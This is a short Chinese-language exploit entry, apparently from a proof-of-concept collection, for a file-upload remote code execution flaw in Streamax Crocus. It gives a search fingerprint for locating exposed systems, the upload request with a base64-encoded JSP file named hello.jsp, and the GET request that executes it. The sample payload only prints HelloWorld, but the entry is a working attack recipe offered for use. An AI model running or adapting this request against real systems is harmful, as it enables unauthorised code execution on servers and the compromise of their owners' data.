# 锐明技术Crocus-imageupload-文件上传导致RCE漏洞

- **系统**：锐明技术Crocus-imageupload　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="/ThirdResource/respond/respond.min.js"`
- **请求**：`POST /RepairRecord.do?Action=imageupload HTTP/1.1`
- **关键头**：`Content-Type: application/json`

**请求体 / payload**
```
"username": "1",
"license": "1",
"chnnel": 1,
"type": 1,
"imsage": "PCUgb3V0LnByaW50bG4oIkhlbGxvV29ybGQiKTslPg==",
"picturename": "hello.jsp"
GET /SystemFile/PictureRecord/imageupload/hello.jsp HTTP/1.1
Host:
```
- **预期**：200　|　—